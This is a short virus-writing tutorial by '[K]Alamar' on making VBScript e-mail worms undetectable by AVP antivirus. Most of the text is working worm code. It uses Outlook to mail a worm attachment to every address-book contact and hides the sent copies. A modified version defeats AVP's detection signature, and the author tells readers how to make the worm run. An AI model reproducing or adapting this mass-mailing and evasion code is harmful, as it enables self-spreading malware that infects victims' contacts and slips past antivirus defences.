                Anti Avp Vbs I-Worms Detection. By [K]Alamar

   In one of the last Updates, the Avp antivirus has added a detection for
   i-Worms that uses the Outlook replication method, used in almost all
   the Vbs and Js worms, Like the I Love you, Bubbleboy and all of them.
   Ok, this will made your I-worm undetectable for avp till they add it to
   the database; i'm pretty sure that if in your worm you use Outlook
   replication you use this code, or one similar:
   ---
   Dim fso, ws
   Set fso = CreateObject("Scripting.filesystemobject")
   Set ws = CreateObject("WScript.Shell")
   Set OApp = CreateObject("Outlook.Application")
   if oapp="Outlook" then
   Set Mapi = OApp.GetNameSpace("MAPI")
   For Each AddList In Mapi.AddressLists
   If AddList.AddressEntries.Count <> 0 Then
   For AddListCount = 1 To AddList.AddressEntries.Count *
   Set AddListEntry = AddList.AddressEntries(AddListCount)
   Set msg = OApp.CreateItem(0)
   msg.To = AddListEntry.Address
   msg.Subject = "Your subject"
   msg.Body = "The body"
   msg.Attachments.Add "path to your Worm"
   msg.DeleteAfterSubmit = True
   If msg.To <> "" Then
   msg.Send
   End If
   Next
   End If
   Next
   end if
   ---
   The only thing that you should do is add one line and change another,
   like here (lines with * are the modified ones):
   ---
   Dim fso, ws
   Set fso = CreateObject("Scripting.filesystemobject")
   Set ws = CreateObject("WScript.Shell")
   Set OApp = CreateObject("Outlook.Application")
   if oapp="Outlook" then
   Set Mapi = OApp.GetNameSpace("MAPI")
   For Each AddList In Mapi.AddressLists
   If AddList.AddressEntries.Count <> 0 Then
   AddlistCount = AddList.AddressEntries.Count *
   For AddListCount = 1 To AddlistCount *
   Set AddListEntry = AddList.AddressEntries(AddListCount)
   Set msg = OApp.CreateItem(0)
   msg.To = AddListEntry.Address
   msg.Subject = "Your subject"
   msg.Body = "The body"
   msg.Attachments.Add "path to your Worm"
   msg.DeleteAfterSubmit = True
   If msg.To <> "" Then
   msg.Send
   End If
   Next
   End If
   Next
   end if
   ---
   You should delete the "*" if you want the worm to work.
   I think that if you know something about I-Worms you should understood
   what i did; i just create a new variable, AddlistCount , and make it be
   like the number of addressentries, and then i use that new variable in
   the next line.
   I hope you understood This.
